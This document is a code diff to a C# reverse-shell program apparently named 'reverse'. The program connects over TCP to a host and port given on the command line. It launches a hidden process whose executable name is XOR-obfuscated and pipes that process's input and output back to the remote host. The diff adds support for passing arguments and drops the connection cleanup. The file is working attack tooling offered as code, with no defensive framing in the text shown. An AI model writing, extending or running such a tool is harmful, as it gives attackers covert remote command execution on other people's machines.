@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Text;
 using System.IO;
 using System.Diagnostics;
@@ -17,16 +17,18 @@ namespace reverse
             string host = args[0];
             int port = Int32.Parse(args[1]);
             string envvar = args[2];
-            int xorkey = Int32.Parse(args[3]);
+            string arguments = args[3]; 
+            int xorkey = Int32.Parse(args[4]);
+
 
             string envvar1 = "";
             for (int i = 0; i < envvar.Length; i++)
             {
                 char c = (char)(envvar[i] ^ xorkey);
-                envvar1 = envvar1 + c;
+                envvar1 += c;
             }
 
-            Console.WriteLine("executing whatever is set in '{0}' pointing to {1}:{2}", envvar1,host,port);
+            Console.WriteLine("executing {0} {3} and redirecting stdout / stderr to {1}:{2}", envvar1, host, port, arguments);
 
             using (TcpClient client = new TcpClient(host, port))
             {
@@ -38,9 +40,9 @@ namespace reverse
                         streamWriter = new StreamWriter(stream);
                         StringBuilder strInput = new StringBuilder();
                         Process p = new Process();
-                        //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable("COMSPEC");
-                        p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1);
-                        //p.StartInfo.FileName = envvar1;
+                        //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1); 
+                        p.StartInfo.FileName = envvar1;
+                        p.StartInfo.Arguments = arguments;
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
                         p.StartInfo.RedirectStandardOutput = true;
@@ -60,9 +62,6 @@ namespace reverse
                         }
                     }
                 }
-
-                // Let's at least try to be kind :)
-                client.Close();
             }
         }
 
@@ -83,7 +82,7 @@ namespace reverse
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception err) { }
+                catch (Exception) { }
             }
         }
 
@@ -98,7 +97,7 @@ namespace reverse
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception err) { }
+                catch (Exception) { }
             }
         }
 
